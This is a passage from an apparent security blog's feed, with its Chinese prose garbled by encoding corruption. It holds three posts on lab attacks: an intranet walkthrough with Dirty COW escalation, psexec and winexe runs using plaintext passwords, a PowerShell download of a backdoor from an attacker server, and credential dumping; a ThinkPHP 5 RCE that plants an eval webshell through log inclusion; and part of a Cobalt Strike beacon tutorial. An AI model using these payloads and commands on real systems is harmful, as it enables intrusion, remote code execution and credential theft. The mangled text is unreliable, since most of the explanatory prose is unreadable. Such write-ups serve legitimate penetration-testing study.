src="https://raw.githubusercontent.com/chencicici/images/main/202207231737750.png"></p><p>ä½†æ˜¯æ²¡åå¼¹æˆåŠŸï¼Œä¸€å¼€å§‹æˆ‘è§‰å¾—æ˜¯æ²¡æœ‰æ‰§è¡Œæƒé™ï¼Œäºæ˜¯åˆ°&#x2F;tmpç›®å½•ä¸‹å»æ‰§è¡Œï¼Œè¿˜æ˜¯æ²¡æœ‰åå¼¹æˆåŠŸï¼Œåº”è¯¥è·Ÿåå‘ä»£ç†æœ‰å…³ã€‚æˆ‘ä»¬è®¿é—®çš„æµé‡æ˜¯ä»centosè½¬å‘ç»™ubuntuï¼Œè€Œä¸”æˆ‘ä»¬ä¸èƒ½ç›´æ¥è®¿é—®ubuntuï¼Œä¸åœ¨ä¸€ä¸ªç½‘æ®µï¼Œæˆ‘ä»¬çš„æµé‡æ˜¯é€šè¿‡centosè½¬å‘çš„ï¼Œæ‹¿åˆ°çš„shellæ˜¯ubuntuçš„</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207232329857.png"></p><p>ä½†æ˜¯æ‰§è¡Œåå¼¹msfçš„æ—¶å€™å»é€šè¿‡å»ä¸‹è½½kaliä¸Šçš„åé—¨æ‰§è¡Œï¼Œè€Œubuntuå’Œkaliä¸åœ¨ä¸€ä¸ªç½‘æ®µæ‰€ä»¥æ²¡æ³•è®¿é—®ï¼Œå¦‚æœæ˜¯å¤–ç½‘ï¼Œkaliå’Œubuntuéƒ½åœ¨å¤–ç½‘ä¸”ubuntuå‡ºç½‘çš„è¯æ˜¯å¯ä»¥åå¼¹çš„ï¼Œä½†æ˜¯è¿™é‡Œæ˜¯å†…ç½‘è‡ªå·±æ­å»ºçš„ç¯å¢ƒ</p><p>æ‰€ä»¥è¿™å°ubuntuçš„æœºå™¨ï¼Œæä¸ææƒå·²ç»æ— æ‰€è°“äº†ï¼Œæ ¹æ®æˆ‘ä»¬æ‹¿åˆ°çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬è¦æ‹¿åˆ°centosçš„shellæ‰èƒ½ç»§ç»­ä¸‹ä¸€æ­¥ã€‚</p><p>ç»§ç»­å¾€ä¸‹,ä¹Ÿæ²¡æœ‰æ‰¾åˆ°å…³é”®ä¿¡æ¯ï¼Œæ‰¾äº†ä¸€ä¸‹å…¶ä»–å¸ˆå‚…çš„æ–‡ç« ï¼Œè¯´æ˜¯å­˜åœ¨&#x2F;tmp&#x2F;mysql&#x2F;test.txtï¼Œä½†æˆ‘è¿™é‡Œå´æ²¡æœ‰ï¼Œæˆ‘ä¸Šé¶æœºçœ‹ç¡®å®ä¹Ÿæ²¡æœ‰ï¼Œä¸å¤ªæ‡‚ä¸ºä»€ä¹ˆ,å€Ÿç”¨ä¸€å¼ å…¶ä»–å¸ˆå‚…çš„å›¾</p><p>wwwuser&#x2F;wwwuser_123Aqx</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191223210200-68a25aaa-2584-1.png" alt="img"></p><p>sshè¿æ¥centosçš„æ—¶å€™æŠ¥é”™</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207232347136.png"></p><p>ä¹‹æ‰€ä»¥æŠ¥é”™æ˜¯å› ä¸ºOpenSSH 7.0ä»¥åçš„ç‰ˆæœ¬ä¸å†æ”¯æŒssh-dss (DSA)ç®—æ³•ï¼Œè§£å†³æ–¹æ³•æ˜¯å¢åŠ é€‰é¡¹-oHostKeyAlgorithms&#x3D;+ssh-dss,å³å¯æˆåŠŸè§£å†³</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -oHostKeyAlgorithms=+ssh-dss  wwwuser@192.168.31.54</span><br></pre></td></tr></table></figure><p>æˆåŠŸè¿æ¥</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207232348457.png"></p><p>ä½¿ç”¨ä¸Šé¢åå¼¹msfçš„æ–¹æ³•ï¼Œå°†shellä¸Šçº¿åˆ°msf</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207232354309.png"></p><p>åœ¨tmpç›®å½•ä¸‹æ‰§è¡Œ</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207232357963.png"></p><p>msfæ”¶åˆ°ä¼šè¯</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207232358817.png"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>linux ææƒä¸‰æ¿æ–§ å†…æ ¸ã€sudo -lã€rootæƒé™å‘½ä»¤</p><p>å°è¯•äº†sudo -lå’Œrootæƒé™éƒ½æ— æœï¼Œmsfä¹Ÿæä¸åŠ¨ï¼ŒæŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬ç¬¦åˆè„ç‰›ï¼Œå°è¯•å†…æ ¸ææƒ</p><p>æŠŠææƒæ–‡ä»¶ä¼ ä¸Šå»ç¼–è¯‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240015422.png"></p><p>åˆ‡æ¢ç”¨æˆ·</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240017481.png"></p><p>åœ¨ä½¿ç”¨æ­¤ç”¨æˆ·è¿è¡Œåˆšåˆšä¸Šçº¿msfçš„payloadï¼Œæˆ–è€…ç›´æ¥è¿è¡Œtmpç›®å½•ä¸‹çš„åé—¨ï¼Œè·å¾—ä¸€ä¸ªrootæƒé™çš„ä¼šè¯</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240020674.png"></p><h1 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h1><h2 id="ä»£ç†"><a href="#ä»£ç†" class="headerlink" title="ä»£ç†"></a>ä»£ç†</h2><p>æŸ¥çœ‹ipå‘ç°æœ‰ä¸¤ä¸ªç½‘æ®µ</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240021466.png" style="zoom:50%;" /><p>æ·»åŠ è·¯ç”±ï¼Œå°†msfä»£ç†è¿›å†…ç½‘ï¼Œå†èµ·ä¸€ä¸ªåå‘ä»£ç†æ–¹ä¾¿ä½¿ç”¨åˆ«çš„å·¥å…·</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240026805.png"></p><p>proxychainsæ·»åŠ ä¸€ä¸ªä»£ç†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure><p>![image-20220724002827926](&#x2F;Users&#x2F;chenci&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220724002827926.png)</p><p>ç”¨nmapæ‰«æå­˜æ´»ä¸»æœºå’Œç«¯å£ï¼Œè¦æ³¨æ„çš„æ˜¯prxychainsä»£ç†ä¸äº†icmpæµé‡ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨pingï¼Œåªèƒ½ç”¨tcpå»æ‰«æ</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240046322.png"></p><p>ä¹Ÿå¯ä»¥ç”¨msfè‡ªå¸¦çš„æ¨¡å—å»æ‰«æ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ‰«æå­˜æ´»ä¸»æœº</span></span><br><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br></pre></td></tr></table></figure><p>æ‰«å‡ºä¸‰å°å­˜æ´»ä¸»æœº</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240045848.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ‰«æç«¯å£</span><br><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240048629.png"></p><p>nmapæ‰«æçš„ç²¾ç¡®ä¸€ç‚¹</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240104316.png"></p><p>ä¸‰å°ä¸»æœºéƒ½ä¸ºwindowsï¼Œ10å¼€å¯äº†53ç«¯å£ï¼Œæ¨æµ‹ä¸ºåŸŸæ§ï¼Œ20å¼€å¯äº†1433 mssqlï¼Œ30å’Œå…¶ä½™ä¸¤å°éƒ½å­˜åœ¨smbæœåŠ¡ï¼Œå°è¯•æ°¸æ’ä¹‹è“éƒ½ä¸å­˜åœ¨</p><p>æ¢ä¸ªæ–¹æ³•ï¼Œå°è¯•çˆ†ç ´smbç”¨æˆ·ï¼Œå°†ä¸Šé¢è·å–åˆ°çš„ä¸¤ä¸ªå¯†ç æ”¾å…¥å¯†ç æ–‡ä»¶è¿›è¡Œçˆ†ç ´</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240116897.png" style="zoom:50%;" /><p>æœ€åçˆ†ç ´å‡º30ã€20çš„å¯†ç </p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240119461.png"></p><p>ä½¿ç”¨msfè‡ªå¸¦æ¨¡å—æ¥æ”»å‡»,è¦æ³¨æ„çš„æ˜¯è¿™é‡Œä½¿ç”¨æ­£å‘è¿æ¥payloadï¼Œå› ä¸ºæˆ‘ä»¬ä½¿ç”¨åŠ äº†ä»£ç†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> SMBUser administrator</span><br><span class="line"><span class="built_in">set</span> SMBPass 123qwe!ASD</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.93.30</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€ä¸ªsystemæƒé™çš„ä¼šè¯</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240131876.png"></p><p>é€šè¿‡winexeå¾—åˆ°20çš„ä¼šè¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains winexe -U <span class="string">&#x27;administrator%123qwe!ASD&#x27;</span> //192.168.93.20 cmd.exe</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240200277.png"></p><p>ä»–ä¸Šçº¿åˆ°msfï¼Œç”Ÿæˆä¸€ä¸ªshellï¼Œå› ä¸ºç›®æ ‡ä¸»æœºä¸å‡ºç½‘ï¼Œæ‰€ä»¥æŠŠshellä¸Šä¼ åˆ°centosä¸»æœºä¸Š,å†ç”±centosä¸»æœºç”¨pythonèµ·ä¸€ä¸ªwebæœåŠ¡ï¼Œ20ä¸»æœºä½¿ç”¨powershellå»ä¸‹è½½</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240245860.png" style="zoom:50%;" /><p>æ³¨æ„ä¸è¦å’ŒwebæœåŠ¡ç«¯å£èµ·å†²çªï¼Œä½¿ç”¨8899ç«¯å£</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240245938.png"></p><p>å¼€å¯è¿œç¨‹æ¡Œé¢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#è®¾ç½®è¿œç¨‹æ¡Œé¢ç«¯å£</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /t REG_DWORD /v portnumber /d 3389 /f</span><br><span class="line"><span class="comment">#å¼€å¯è¿œç¨‹æ¡Œé¢</span></span><br><span class="line">wmic RDTOGGLE WHERE ServerName=<span class="string">&#x27;%COMPUTERNAME%&#x27;</span> call SetAllowTSConnections 1</span><br><span class="line"><span class="comment">#æ£€æŸ¥ç«¯å£çŠ¶æ€</span></span><br><span class="line">netstat -an|find <span class="string">&quot;3389&quot;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨administratorç™»å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.93.128:8899/shell1.exe&#x27;</span>,<span class="string">&#x27;C:\shell.exe&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ä¸‹è½½åé—¨</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240242645.png" style="zoom:50%;" /><p>kalièµ·ä¸€ä¸ªç›‘å¬ï¼Œæ³¨æ„è¿™é‡Œè¦ä½¿ç”¨æ­£å‘ç›‘å¬ï¼Œå› ä¸ºç›®æ ‡ä¸»æœºæ˜¯ä¸å‡ºç½‘çš„ï¼Œè¿è¡Œåé—¨æˆåŠŸåå¼¹ä¼šè¯</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240248971.png"></p><p>è¿ç§»è¿›ç¨‹åˆ°ä¸€ä¸ªç³»ç»Ÿè¿›ç¨‹åï¼Œä½¿ç”¨kiwiæŠ“å–å¯†ç ï¼ŒæŠ“åˆ°åŸŸæ§å¯†ç </p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240253602.png"></p><p>ä½¿ç”¨åŒæ ·çš„æ–¹æ³•æ‹¿åˆ°cmd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains winexe -U <span class="string">&#x27;administrator%zxcASDqw123!!&#x27;</span> //192.168.93.10 cmd.exe</span><br></pre></td></tr></table></figure><p>ä¸€æ ·çš„æ–¹æ³•ä¸Šçº¿msfï¼Œåªéœ€è¦ä¿®æ”¹æ­£å‘ç›‘å¬çš„ipå³å¯</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240308139.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;åŸºæœ¬ä¿¡æ¯&quot;&gt;&lt;a href=&quot;#åŸºæœ¬ä¿¡æ¯&quot; class=&quot;headerlink&quot; title=&quot;åŸºæœ¬ä¿¡æ¯&quot;&gt;&lt;/a&gt;åŸºæœ¬ä¿¡æ¯&lt;/h1&gt;&lt;p&gt;æœ¬æ¬¡æµ‹è¯•ä¸ºé»‘ç›’æµ‹è¯•ï¼Œæ‰€ä»¥æ‰€æœ‰ä¸»æœºéƒ½ä¸ºæŒ‚èµ·çŠ¶æ€ï¼Œä¸”è´¦å·éƒ½é»˜è®¤å·²ç»ç™»å½•&lt;/p&gt;
&lt;p&gt;å·²çŸ¥å‡ºç½‘ä¸»æœºä¸ºcentosä¸»æœº&lt;/p&gt;
&lt;p&gt;å°†centoså‡ºç½‘ç½‘å¡å’Œkaliæ”»å‡»æœºç½‘å¡éƒ½è®¾ç½®ä¸ºæ¡¥æ¥å¤åˆ¶ç‰©ç†ç½‘ç»œæ¨¡å¼&lt;/p&gt;
&lt;p&gt;å…¶å®ƒç½‘å¡éƒ½é»˜è®¤vmnet2æ¨¡å¼ï¼Œæ·»åŠ vmnet2ç½‘å¡&lt;/p&gt;</summary>
    
    
    
    <category term="æ‰“é¶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="ATT&amp;CK" scheme="https://syst1m.top/tags/ATT-CK/"/>
    
    <category term="å†…ç½‘æ¸—é€" scheme="https://syst1m.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>tp5+php7.3 getshell</title>
    <link href="https://syst1m.top/2022/07/21/tp5-php7-3-getshell/"/>
    <id>https://syst1m.top/2022/07/21/tp5-php7-3-getshell/</id>
    <published>2022-07-21T10:09:32.000Z</published>
    <updated>2022-07-21T11:29:37.842Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä»¥ä¸‹ä¸ºæœ¬åœ°ç¯å¢ƒæ­å»º</p><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>æŠ¥é”™æ‹¿åˆ°cmsä¿¡æ¯,windows+iis+tp5<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207211912912.png"></p><h1 id="webæ‰“ç‚¹"><a href="#webæ‰“ç‚¹" class="headerlink" title="webæ‰“ç‚¹"></a>webæ‰“ç‚¹</h1><p>thinkphp RCEæ¼æ´è¿˜æ˜¯æŒºå¤šçš„,ç›´æ¥ä¸Štpæ£€æµ‹ç¥å™¨<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207211914600.png"></p><p>èƒ½æ‰§è¡Œphpinfoç¡®å®å­˜åœ¨RCE,æ‹¿åˆ°çœŸå®è·¯å¾„,å¾—åˆ°phpä¸º7.3<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207211915864.png"></p><p>ç›´æ¥ä½¿ç”¨å·¥å…·å†™shellå¤±è´¥</p><p>expå†™shellå¤±è´¥,php7.1ä»¥ä¸Šæ— æ³•ä½¿ç”¨assert</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;test.php&#x27;</span>,<span class="string">&#x27;&lt;?php phpinfo();&#x27;</span>)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</span><br></pre></td></tr></table></figure><h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p>googleäº†ä¸€ä¸‹,æ‰¾åˆ°æ—¥å¿—å†™shellæ–¹æ³•</p><p>å°†shellå†™å…¥æ—¥å¿—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/index.php?s=captcha</span><br><span class="line">_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;server[]=-<span class="number">1</span>&amp;get[]=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207211922941.png"></p><p>åŒ…å«æ—¥å¿—æ–‡ä»¶getshell,æˆåŠŸæ‰§è¡Œphpinfo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=-<span class="number">1</span>&amp;get[]=../runtime/log/<span class="number">202207</span>/<span class="number">21</span>.log&amp;shell=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207211923675.png"></p><p>ä¸Šèšå‰‘<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207211926496.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207211928165.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;ä»¥ä¸‹ä¸ºæœ¬åœ°ç¯å¢ƒæ­å»º&lt;/p&gt;
&lt;h1 id=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;a href=&quot;#ä¿¡æ¯æ”¶é›†&quot; class=&quot;headerlink&quot; title=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;/a&gt;ä¿¡æ¯æ”¶é›†&lt;/h1&gt;&lt;p&gt;æŠ¥é”™æ‹¿åˆ°cmsä¿¡æ¯,windows+iis+tp5&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202207211912912.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;webæ‰“ç‚¹&quot;&gt;&lt;a href=&quot;#webæ‰“ç‚¹&quot; class=&quot;headerlink&quot; title=&quot;webæ‰“ç‚¹&quot;&gt;&lt;/a&gt;webæ‰“ç‚¹&lt;/h1&gt;</summary>
    
    
    
    <category term="æ¸—é€å®æˆ˜" scheme="https://syst1m.top/categories/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="getshell" scheme="https://syst1m.top/tags/getshell/"/>
    
    <category term="thinkphp" scheme="https://syst1m.top/tags/thinkphp/"/>
    
  </entry>
  
  <entry>
    <title>Cobalt Strikeä½¿ç”¨å­¦ä¹ </title>
    <link href="https://syst1m.top/2022/07/20/Cobalt-Strike%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/"/>
    <id>https://syst1m.top/2022/07/20/Cobalt-Strike%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-07-20T12:30:38.000Z</published>
    <updated>2022-07-22T11:36:41.948Z</updated>
    
    <content type="html"><![CDATA[<h1 id="åŸºæœ¬ä½¿ç”¨"><a href="#åŸºæœ¬ä½¿ç”¨" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h1><p>Cobalt Strikeä½¿ç”¨C&#x2F;Sæ¶æ„ï¼ŒCobalt Strikeçš„å®¢æˆ·ç«¯è¿æ¥åˆ°å›¢é˜ŸæœåŠ¡å™¨ï¼Œå›¢é˜ŸæœåŠ¡å™¨è¿æ¥åˆ°ç›®æ ‡ï¼Œä¹Ÿå°±æ˜¯è¯´Cobalt Strikeçš„å®¢æˆ·ç«¯ä¸ä¸ç›®æ ‡æœåŠ¡å™¨è¿›è¡Œäº¤äº’ã€‚</p><h2 id="å¯åŠ¨æœåŠ¡ç«¯"><a href="#å¯åŠ¨æœåŠ¡ç«¯" class="headerlink" title="å¯åŠ¨æœåŠ¡ç«¯"></a>å¯åŠ¨æœåŠ¡ç«¯</h2><p>æœåŠ¡ç«¯ä¸€èˆ¬è®¾åœ¨å…¬ç½‘ipçš„æœåŠ¡å™¨ä¸Š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ./teamserver your_ip your_passowrd [config_file]</span></span><br><span class="line">./teamserver 192.168.31.118 123456</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207212117798.png"></p><h2 id="å¯åŠ¨å®¢æˆ·ç«¯"><a href="#å¯åŠ¨å®¢æˆ·ç«¯" class="headerlink" title="å¯åŠ¨å®¢æˆ·ç«¯"></a>å¯åŠ¨å®¢æˆ·ç«¯</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cobaltstrike   </span><br></pre></td></tr></table></figure><p>è¾“å…¥åˆšæ‰è®¾ç½®çš„ipå’Œå¯†ç </p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207212121225.png"></p><h2 id="è¿æ¥å¤šä¸ªæœåŠ¡ç«¯"><a href="#è¿æ¥å¤šä¸ªæœåŠ¡ç«¯" class="headerlink" title="è¿æ¥å¤šä¸ªæœåŠ¡ç«¯"></a>è¿æ¥å¤šä¸ªæœåŠ¡ç«¯</h2><p>ç›´æ¥æ–°å»ºé…ç½®å³å¯</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207212123267.png"></p><h1 id="ç›‘å¬å™¨"><a href="#ç›‘å¬å™¨" class="headerlink" title="ç›‘å¬å™¨"></a>ç›‘å¬å™¨</h1><p>ç›‘å¬å™¨å°±æ˜¯ç­‰å¾…è¢«å…¥ä¾µç³»ç»Ÿè¿æ¥è‡ªå·±çš„ä¸€ä¸ªæœåŠ¡ã€‚è¦æ˜¯ä¸ºäº†æ¥å—payloadå›ä¼ çš„å„ç±»æ•°æ®ï¼Œç±»ä¼¼äºMSFä¸­handlerçš„ä½œç”¨ã€‚æ¯”å¦‚payloadåœ¨ç›®æ ‡æœºå™¨æ‰§è¡Œä»¥åï¼Œå°±ä¼šå›è¿åˆ°ç›‘å¬å™¨ç„¶åä¸‹è½½æ‰§è¡ŒçœŸæ­£çš„shellcodeä»£ç ã€‚</p><h2 id="Beacon"><a href="#Beacon" class="headerlink" title="Beacon"></a>Beacon</h2><ul><li>Beaconæ˜¯CSçš„payloadï¼Œå’Œmsfä¸­çš„meterpreterä¸€æ ·</li><li>Beaconæœ‰ä¸¤ç§é€šä¿¡æ¨¡å¼ã€‚ä¸€ç§æ˜¯å¼‚æ­¥é€šä¿¡æ¨¡å¼ï¼Œè¿™ç§æ¨¡å¼é€šä¿¡æ•ˆç‡ç¼“æ…¢ï¼ŒBeaconå›è¿å›¢é˜ŸæœåŠ¡å™¨ã€ä¸‹è½½ä»»åŠ¡ã€ç„¶åä¼‘çœ ï¼›å¦ä¸€ç§æ˜¯äº¤äº’å¼é€šä¿¡æ¨¡å¼ï¼Œè¿™ç§æ¨¡å¼çš„é€šä¿¡æ˜¯å®æ—¶å‘ç”Ÿçš„ã€‚</li><li>é€šè¿‡HTTPã€HTTPSå’ŒDNSå‡ºå£ç½‘ç»œ</li><li>ä½¿ç”¨SMBåè®®çš„æ—¶å€™æ˜¯ç‚¹å¯¹ç‚¹é€šä¿¡</li></ul><h2 id="HTTPå’ŒHTTPS-Beacon"><a href="#HTTPå’ŒHTTPS-Beacon" class="headerlink" title="HTTPå’ŒHTTPS Beacon"></a>HTTPå’ŒHTTPS Beacon</h2><ul><li>HTTP å’Œ HTTPS Beacon HTTPå’ŒHTTPS Beaconä¹Ÿå¯ä»¥å«åšWeb Beaconã€‚é»˜è®¤è®¾ç½®æƒ…å†µä¸‹ï¼ŒHTTP å’Œ HTTPS Beacon é€šè¿‡ HTTP GET è¯·æ±‚æ¥ä¸‹è½½ä»»åŠ¡ã€‚è¿™äº› Beacon é€šè¿‡ HTTP POST è¯·æ±‚ä¼ å›æ•°æ®ã€‚</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows/beacon_http/reverse_http</span><br><span class="line">windows/beacon_https/reverse_https</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207212132790.png"></p><p>æµ‹è¯•ä¸€ä¸‹httpç›‘å¬å™¨ï¼Œç”¨åˆšæ‰çš„ç›‘å¬å™¨ç”Ÿæˆä¸€ä¸ªé’“é±¼é“¾æ¥</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207212146999.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207212300319.png"></p><p>å°†ç”Ÿæˆçš„payloadæ”¾å…¥windowsä¸­è¿è¡Œ</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207212307393.png"></p><p>æˆåŠŸä¸Šçº¿cs</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207212308113.png"></p><p>HTTPSå’ŒHTTPä¸€æ ·ï¼Œä¸åŒçš„æ˜¯HTTPSéœ€è¦ä¸€ä¸ªSSLè¯ä¹¦å…·ä½“å¦‚ä½•é…ç½®å¯ä»¥å‚è€ƒï¼š<a href="https://www.cobaltstrike.com/help-malleable-c2#validssl">https://www.cobaltstrike.com/help-malleable-c2#validssl</a></p><h2 id="DNS-Beacon"><a href="#DNS-Beacon" class="headerlink" title="DNS Beacon"></a>DNS Beacon</h2><p>DNS Beaconï¼Œé¡¾åæ€ä¹‰å°±æ˜¯ä½¿ç”¨DNSè¯·æ±‚å°†Beaconè¿”å›ã€‚è¿™äº› DNS è¯·æ±‚ç”¨äºè§£æç”±ä½ çš„ CS å›¢é˜ŸæœåŠ¡å™¨ä½œä¸ºæƒå¨ DNS æœåŠ¡å™¨çš„åŸŸåã€‚DNS å“åº”å‘Šè¯‰ Beacon ä¼‘çœ æˆ–æ˜¯è¿æ¥åˆ°å›¢é˜ŸæœåŠ¡å™¨æ¥ä¸‹è½½ä»»åŠ¡ã€‚DNS å“åº”ä¹Ÿå‘Šè¯‰ Beacon å¦‚ä½•ä»ä½ çš„å›¢é˜ŸæœåŠ¡å™¨ä¸‹è½½ä»»åŠ¡ã€‚</p><p>å› ä¸ºæ²¡æœ‰å¤šä½™çš„åŸŸåï¼Œæ‰€ä»¥ä¸æ¼”ç¤º</p><h2 id="SMB-Beacon"><a href="#SMB-Beacon" class="headerlink" title="SMB Beacon"></a>SMB Beacon</h2><p>SMB Beacon ä½¿ç”¨å‘½åç®¡é“é€šè¿‡ä¸€ä¸ªçˆ¶ Beacon è¿›è¡Œé€šä¿¡ã€‚è¿™ç§å¯¹ç­‰é€šä¿¡å¯¹åŒä¸€å°ä¸»æœºä¸Šçš„ Beacon å’Œè·¨ç½‘ç»œçš„ Beacon éƒ½æœ‰æ•ˆã€‚Windows å°†å‘½åç®¡é“é€šä¿¡å°è£…åœ¨ SMB åè®®ä¸­ã€‚å› æ­¤å¾—å SMB 